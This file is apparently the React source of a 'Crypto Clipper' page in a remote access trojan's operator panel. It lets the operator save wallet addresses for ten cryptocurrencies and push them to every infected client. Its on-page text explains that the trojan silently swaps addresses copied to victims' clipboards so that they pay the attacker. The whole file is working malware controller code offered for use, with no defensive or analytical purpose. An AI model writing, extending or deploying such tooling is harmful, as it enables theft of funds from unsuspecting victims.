import { useState, useEffect } from 'react'
import { Check, Save, Zap } from 'lucide-react'
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider'

// Supported coins — coin key, display name, address placeholder
const COINS = [
  { key: 'BTC',  name: 'Bitcoin',      symbol: '₿',  placeholder: 'bc1q... or 1... or 3...' },
  { key: 'ETH',  name: 'Ethereum',     symbol: 'Ξ',  placeholder: '0x...' },
  { key: 'BNB',  name: 'BNB (BSC)',    symbol: 'B',  placeholder: '0x... (same format as ETH)' },
  { key: 'SOL',  name: 'Solana',       symbol: '◎',  placeholder: 'Base58 address...' },
  { key: 'TRX',  name: 'Tron',         symbol: 'T',  placeholder: 'T...' },
  { key: 'LTC',  name: 'Litecoin',     symbol: 'Ł',  placeholder: 'L... or M... or ltc1...' },
  { key: 'DOGE', name: 'Dogecoin',     symbol: 'Ð',  placeholder: 'D...' },
  { key: 'XMR',  name: 'Monero',       symbol: 'ɱ',  placeholder: '4...' },
  { key: 'XRP',  name: 'XRP',          symbol: 'X',  placeholder: 'r...' },
  { key: 'BCH',  name: 'Bitcoin Cash', symbol: '₿C', placeholder: 'bitcoincash:q... or q...' },
]

export default function ClipperPage() {
  const { send, subscribe, isConnected } = useBridgeWebSocket()
  const [addresses, setAddresses] = useState<Record<string, string>>({})
  const [saved, setSaved] = useState(false)
  const [armed, setArmed] = useState<Record<string, boolean>>({})

  // Load saved addresses on connect
  useEffect(() => {
    if (!isConnected) return
    send({ type: 'db_query', query: 'get_clipper_addresses' })
  }, [isConnected, send])

  useEffect(() => {
    const unsub = subscribe('db_response', (msg: any) => {
      if (msg.query === 'get_clipper_addresses') {
        const data = msg.data || {}
        setAddresses(data)
        const armedMap: Record<string, boolean> = {}
        for (const coin of COINS) armedMap[coin.key] = !!data[coin.key]
        setArmed(armedMap)
      }
    })
    return unsub
  }, [subscribe])

  useEffect(() => {
    const unsub = subscribe('clipper_addresses_saved', (msg: any) => {
      const data = msg.addresses || {}
      const armedMap: Record<string, boolean> = {}
      for (const coin of COINS) armedMap[coin.key] = !!data[coin.key]
      setArmed(armedMap)
      setSaved(true)
      setTimeout(() => setSaved(false), 2500)
    })
    return unsub
  }, [subscribe])

  const handleChange = (coin: string, value: string) => {
    setAddresses(prev => ({ ...prev, [coin]: value }))
  }

  const handleSave = () => {
    // Strip empty entries
    const clean: Record<string, string> = {}
    for (const [k, v] of Object.entries(addresses)) {
      if (v && v.trim()) clean[k] = v.trim()
    }
    send({ type: 'set_clipper_addresses', addresses: clean })
  }

  const armedCount = Object.values(armed).filter(Boolean).length

  return (
    <div className="space-y-6 p-6">
      <div>
        <h2 className="text-2xl font-semibold text-slate-100 flex items-center gap-2">
          <Zap className="w-6 h-6 text-yellow-400" />
          Crypto Clipper
        </h2>
        <p className="text-sm text-slate-400 mt-1">
          Save your wallet addresses. Any connected RAT client will silently replace copied crypto addresses
          on the victim's clipboard with your address. Active on all currently connected and future clients.
        </p>
      </div>

      {/* Status bar */}
      <div className="flex items-center gap-3 px-4 py-3 rounded-lg bg-slate-800/60 border border-slate-700">
        <div className={`w-2 h-2 rounded-full ${armedCount > 0 ? 'bg-green-400 animate-pulse' : 'bg-slate-600'}`} />
        <span className="text-sm text-slate-300">
          {armedCount > 0
            ? <><span className="text-green-400 font-medium">{armedCount} coin{armedCount > 1 ? 's' : ''} armed</span> — clipboard hijack active on all connected clients</>
            : 'No addresses saved — clipper is inactive'}
        </span>
      </div>

      {/* Coin address grid */}
      <div className="grid gap-3 md:grid-cols-2">
        {COINS.map(coin => (
          <div
            key={coin.key}
            className={`flex items-center gap-3 px-4 py-3 rounded-lg border transition-colors ${
              armed[coin.key]
                ? 'bg-green-950/30 border-green-700/50'
                : 'bg-slate-900 border-slate-700'
            }`}
          >
            {/* Coin icon */}
            <div className={`w-9 h-9 rounded-lg flex items-center justify-center text-sm font-bold shrink-0 ${
              armed[coin.key] ? 'bg-green-700/40 text-green-300' : 'bg-slate-700 text-slate-300'
            }`}>
              {coin.symbol}
            </div>

            {/* Label + input */}
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-2 mb-1">
                <span className="text-xs font-semibold text-slate-300">{coin.name}</span>
                <span className="text-xs text-slate-500">{coin.key}</span>
                {armed[coin.key] && (
                  <span className="text-xs text-green-400 ml-auto">● Armed</span>
                )}
              </div>
              <input
                type="text"
                value={addresses[coin.key] || ''}
                onChange={e => handleChange(coin.key, e.target.value)}
                placeholder={coin.placeholder}
                className="w-full bg-slate-800 border border-slate-600 text-slate-200 text-xs px-2 py-1.5 rounded focus:border-yellow-500 focus:outline-none font-mono"
              />
            </div>
          </div>
        ))}
      </div>

      {/* Save button */}
      <div className="flex justify-end pt-2">
        <button
          onClick={handleSave}
          className="flex items-center gap-2 px-5 py-2.5 bg-yellow-600 hover:bg-yellow-500 text-white text-sm font-medium rounded-lg transition-colors"
        >
          {saved ? (
            <><Check className="w-4 h-4" /> Saved &amp; Pushed!</>
          ) : (
            <><Save className="w-4 h-4" /> Save &amp; Push to All Clients</>
          )}
        </button>
      </div>

      {/* Info box */}
      <div className="rounded-lg bg-slate-900 border border-slate-700 p-4 text-xs text-slate-400 space-y-1">
        <p className="font-medium text-slate-300 mb-2">How it works</p>
        <p>• The RAT polls the victim's clipboard every 2 seconds</p>
        <p>• If it detects an address matching a supported coin, it silently replaces it with yours</p>
        <p>• The victim pastes what they think is their address — but it's yours</p>
        <p>• Addresses are pushed live to all currently connected clients when you save</p>
        <p>• New clients automatically receive the addresses within 2 seconds of connecting</p>
        <p className="pt-1 text-slate-500">Supported: BTC (legacy + bech32), ETH/EVM, SOL, TRX, LTC, DOGE, XMR, XRP, BCH</p>
      </div>
    </div>
  )
}
